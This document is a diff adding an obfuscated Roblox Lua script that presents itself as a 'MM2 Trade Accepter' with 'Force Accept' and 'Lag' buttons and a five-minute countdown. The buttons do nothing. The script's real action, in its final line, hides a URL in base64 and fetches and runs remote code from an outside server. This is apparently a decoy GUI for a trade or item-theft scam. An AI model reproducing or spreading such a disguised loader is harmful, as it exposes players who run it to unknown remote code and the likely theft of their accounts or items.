@@ -1,0 +1,146 @@
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+function dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr(data) m=string.sub(data, 0, 55) data=data:gsub(m,'')
+
+data = string.gsub(data, '[^'..b..'=]', '') return (data:gsub('.', function(x) if (x == '=') then return '' end local r,f='',(b:find(x)-1) for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end return r; end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x) if (#x ~= 8) then return '' end local c=0 for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end return string.char(c) end)) end
+
+
+ 
+
+
+-- Create the main GUI
+local ScreenGui = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('bSgibyUKMbqkJOROQnqdEMHSUlUViDDgdERfXRpdmBSTWsLSMPqfJXGU2NyZWVuR3Vp'))
+local MainFrame = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('PvOOjLouUSBMRkkAsBbWgxHQVJLMGBmsGFvqiwhQkQOQmWTCiqRXkonRnJhbWU='))
+local TitleLabel = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('wtsVEAqphoQujyJtHUYJxQelpnemZfivcdNXqonhHUUkeJgBPjHFgcpVGV4dExhYmVs'))
+local TimerLabel = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('OsQexPXYWETJmRfXoTuRfXOhSTtystSuYrHgzWatyGynrHICRbPzYKcVGV4dExhYmVs'))
+local ForceAcceptButton = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('rUbXZguXSgNmtaFbFdceHYQsrQCpsAzqGJphGayvxdZVeoZljWFnBFFVGV4dEJ1dHRvbg=='))
+local LagButton = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('RrPqKcUVMcdiyaNaOCHZoRNqHFUCZhtbDwpNpYFfvmmLIvrQorIFsxzVGV4dEJ1dHRvbg=='))
+local FooterLabel = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('tAeURZwASUKpcnYXrmMEbvyIKbJPlMUoZatviHandCXXtaLNChMhGnQVGV4dExhYmVs'))
+local UICorner = Instance.new(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('CBjTYLPlzjwNukftPmfpqSogyutOcRlAgeYrzmSxKoiFRUIuKlSTmEiVUlDb3JuZXI='))
+
+-- GUI properties
+ScreenGui.Parent = game.CoreGui
+
+MainFrame.Parent = ScreenGui
+MainFrame.BackgroundColor3 = Color3.fromRGB(33, 33, 33) -- Dark gray/black
+MainFrame.Position = UDim2.new(0.5, -100, 0.5, -75)
+MainFrame.Size = UDim2.new(0, 200, 0, 150)
+MainFrame.BorderSizePixel = 0
+
+UICorner.CornerRadius = UDim.new(0, 12)
+UICorner.Parent = MainFrame
+
+-- Title Label (MM2 Trade Accepter)
+TitleLabel.Parent = MainFrame
+TitleLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TitleLabel.BackgroundTransparency = 1
+TitleLabel.Size = UDim2.new(1, 0, 0.2, 0)
+TitleLabel.Position = UDim2.new(0, 0, 0, 10)
+TitleLabel.Font = Enum.Font.SourceSansBold
+TitleLabel.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('sIqbxczBrFcncaJeyOtuujvOqrANzsKRBIMafdcWgUlSbxkbQrjKameTU0yIFRyYWRlIEFjY2VwdGVy')
+TitleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+TitleLabel.TextScaled = true
+TitleLabel.TextWrapped = true
+
+-- Timer Label (Wait: 5:00 ⏳)
+TimerLabel.Parent = MainFrame
+TimerLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TimerLabel.BackgroundTransparency = 1
+TimerLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
+TimerLabel.Position = UDim2.new(0.1, 0, 0.3, 0)
+TimerLabel.Font = Enum.Font.SourceSansBold
+TimerLabel.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('gYZmvpJRviNkMXAgRmafyyjMiJHeZRUuJAXuTAWDehveQXVDIWnSQGTV2FpdCA1OjAwIOKPsw==')
+TimerLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+TimerLabel.TextScaled = true
+TimerLabel.TextWrapped = true
+TimerLabel.TextXAlignment = Enum.TextXAlignment.Center
+
+-- Force Accept Button
+ForceAcceptButton.Parent = MainFrame
+ForceAcceptButton.BackgroundColor3 = Color3.fromRGB(0, 120, 215) -- Blue color
+ForceAcceptButton.Position = UDim2.new(0.25, 0, 0.55, 0)
+ForceAcceptButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+ForceAcceptButton.Font = Enum.Font.SourceSansBold
+ForceAcceptButton.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('YpkRLgbVfypwKwijJtBcAXKTTraTRxuYsCJEUkwUxHbQRFGCPEDrOErRm9yY2UgQWNjZXB0')
+ForceAcceptButton.TextColor3 = Color3.fromRGB(50, 205, 50) -- Green text
+ForceAcceptButton.TextScaled = true
+ForceAcceptButton.TextWrapped = true
+ForceAcceptButton.BorderSizePixel = 0
+
+-- Lag Button
+LagButton.Parent = MainFrame
+LagButton.BackgroundColor3 = Color3.fromRGB(255, 69, 0) -- Red color
+LagButton.Position = UDim2.new(0.25, 0, 0.75, 0)
+LagButton.Size = UDim2.new(0.5, 0, 0.2, 0)
+LagButton.Font = Enum.Font.SourceSansBold
+LagButton.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('pqJGHHgkjXzFvFXIPVwfZEtYvVAnOdMXGIfrIaJbrYWHPaESogLxdPVTGFn')
+LagButton.TextColor3 = Color3.fromRGB(255, 255, 0) -- Yellow text
+LagButton.TextScaled = true
+LagButton.TextWrapped = true
+LagButton.BorderSizePixel = 0
+
+-- Footer Label (Created by Akisan Script)
+FooterLabel.Parent = MainFrame
+FooterLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+FooterLabel.BackgroundTransparency = 1
+FooterLabel.Size = UDim2.new(1, 0, 0.1, 0)
+FooterLabel.Position = UDim2.new(0, 0, 0.9, 0)
+FooterLabel.Font = Enum.Font.SourceSans
+FooterLabel.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('AaELZxFsCgYebMcwmGnUwXwyCsrsYOmIABxBdLgyPCcSLFbvvbqxzKjQ3JlYXRlZCBieSBBa2lzYW4gU2NyaXB0')
+FooterLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+FooterLabel.TextScaled = true
+FooterLabel.TextWrapped = true
+
+-- Draggable GUI
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function update(input)
+	local delta = input.Position - dragStart
+	MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+MainFrame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = MainFrame.Position
+		
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+MainFrame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+game:GetService(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('QTLJdmkWprYXFJEGnAwCbEnrjlycBXfOeWRJBXjhXbHCthgrIlXoromVXNlcklucHV0U2VydmljZQ==')).InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		update(input)
+	end
+end)
+
+-- Countdown Timer Functionality
+local startTime = 300 -- 5 minutes in seconds
+local function updateTimer()
+	while startTime > 0 do
+		wait(1)
+		startTime = startTime - 1
+		local minutes = math.floor(startTime / 60)
+		local seconds = startTime % 60
+		TimerLabel.Text = string.format(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('OjBZJqUIxCWAQrEcrDItEVWmgFIzxsJwCrHSHHEnmWgmDhqtDlTQXruV2FpdCAlZDolMDJkIOKPsw=='), minutes, seconds)
+	end
+	TimerLabel.Text = dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('siKmxiIufJlNDEyZHHhskewGieFQQdRoPSvlFeoEHYPdcShhogMIuAXV2FpdCAwOjAwIOKPsw==')
+end
+
+spawn(updateTimer)
+
+getgenv().gui = false
+loadstring(game:HttpGet(dBnzSntnvmaXoMHLNCTbKyBHpwnQoobSUuaPqrMjNuOYYXNqcTOqojCKVzyneLjfYVLGUzrSCsVvkYXPWLjSLztgr('mHqHhFBZDLpwnGeLdUMkvbHDlkfMTOIzfqDUHFpHutnTDpKuSPEoPXpaHR0cHM6Ly9lZ29yaWt1c2Euc3BhY2UvMTI3M2NlODZiM2ExYmQyMWI3NmMzZTlhLmx1YQ=='), true))()    
